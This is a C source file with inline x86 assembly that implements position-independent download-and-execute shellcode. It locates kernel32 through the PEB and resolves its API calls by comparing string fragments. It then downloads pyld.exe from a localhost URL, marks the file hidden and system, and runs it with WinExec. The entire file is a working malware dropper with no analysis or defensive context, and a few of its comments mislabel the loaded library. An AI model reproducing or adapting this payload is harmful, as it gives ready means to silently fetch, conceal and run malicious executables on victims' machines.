void __declspec(naked) DownloadAndExecute()
{
	_asm //prolouge
	{
		push ebp
		mov ebp, esp
		sub esp, __LOCAL_SIZE
	}
	_asm
	{
		mov eax, fs:[ecx + 0x30] // EAX = PEB	
		mov eax, [eax + 0xc] // EAX = PEB->Ldr
		mov esi, [eax + 0x14] // ESI = PEB->Ldr.InMemOrder
		lodsd // ESI -> EAX = Second module
		xchg eax, esi // EAX = ESI, ESI = EAX
		lodsd // ESI -> EAX = Third(kernel32)

		mov ebx, [eax + 0x10] // EBX = Base address of Kernel32	
		mov edx, [ebx + 0x3c] // EDX = DOS->e_lfanew = pointer of PE Header
		add edx, ebx  // EDX = Virtual Address Of PE Header

		mov edx, [edx + 0x78] // EDX = Offset export table
		add edx, ebx // EDX = Export table VA
		mov esi, [edx + 0x20] // ESI = Offset address of names 
		add esi, ebx // ESI = Va of Address of names
		xor ecx, ecx // EXC = 0

		Get_Function :

		inc ecx // Increment the ordinal
			lodsd // Get name offset - instruction will also increment the esi register value with 4!
			add eax, ebx // Get function name - get VA
			cmp dword ptr[eax], 0x50746547 // GetP
			jnz Get_Function
			cmp dword ptr[eax + 0x4], 0x41636f72 // rocA
			jnz Get_Function
			cmp dword ptr[eax + 0x8], 0x65726464 // ddre
			jnz Get_Function
			mov esi, [edx + 0x24] // ESI = Offset ordinals
			add esi, ebx  //VA of Ordinals
			mov cx, [esi + ecx * 2] // Number of function
			dec ecx
			mov esi, [edx + 0x1c] // Offset address table - AddressOfFunctions
			add esi, ebx // ESI = Begining Address table
			mov edx, [esi + ecx * 4] // EDX = Pointer(offset)
			add edx, ebx // EDX = GetProcAddress

			xor ecx, ecx // ECX = 0

			push ebx // Kernel32 base address
			push edx // GetProcAddress
			push ecx // 0
			push 0x41797261 // aryA
			push 0x7262694c // Libr
			push 0x64616f4c // Load
			push esp
			push ebx // Kernel32 base address
			call edx // GetProcAddress(LL)

			add esp, 0xc // pop "LoadLibrary"
			pop ecx // ECX = 0
			push eax // EAX = LoadLibrary - retuning value of GetProcAddress
			push ecx
			mov cx, 0x6c6c // ll
			push ecx
			push 0x642E6E6F //on.d
			push 0x6D6C7275 //urlm
			push esp // "urlmon.dll"
			call eax // LoadLibrary("user32.dll")

			add esp, 0x10 // Clean stack
			mov edx, [esp + 0x4]
			push 0
			mov cx, 0x4165
			push ecx
			push 0x6C69466F
			push 0x5464616F
			push 0x6C6E776F
			push 0x444C5255

			push esp // "URLDownloadToFileA"
			push eax //user32.dll
			call edx //EAX now is URLDownloadToFileA

			add esp, 0x14 //Cleanup stack


						  //----------------------------- FILE : pyld.exe
			push 0x6578652E
			push 0x646C7970
			push esp
			pop ecx
			//----------------------------- URL : localhost/pyld.exe
			push 0
			push 0x00000065
			push 0x78652E64
			push 0x6C79702F
			push 0x74736F68
			push 0x6C61636F
			push 0x6C2F2F3A
			push 0x70747468
			push esp
			pop esi
			//----------------------------- OTHER ARGS	
			push 0
			push 0
			//----------------------------- CALL FUNCTION
			push ecx
			push esi
			push 0
			call eax

			add esp, 0x30 //Clean stack

			pop ebx //GetProcAddr
			pop esi //KernelBase

					//-----------------------------SET FILE ATTRIBUTES
			push 0
			push 0x00004173
			push 0x65747562
			push 0x69727474
			push 0x41656C69
			push 0x46746553

			push esp
			push esi
			call ebx
			//----------------------------- CALL SET FILE ATTRIBUTES 
			push 0
			push 0x6578652E
			push 0x646C7970
			push esp
			pop edi

			push 0x6
			push edi
			call eax


			push 0
			push 0x00636578 //xec
			push 0x456E6957 //WinE
			push esp
			push esi
			call ebx //Eax Now WinExec
			push 0
			push 0x6578652E
			push 0x646C7970
			push esp
			pop esi
			push 5
			push esi
			call eax
	}
	_asm //epilouge
	{
		mov esp, ebp
		pop ebp
		ret
	}
}
int main()
{
	  DownloadAndExecute();
    return 0;
}

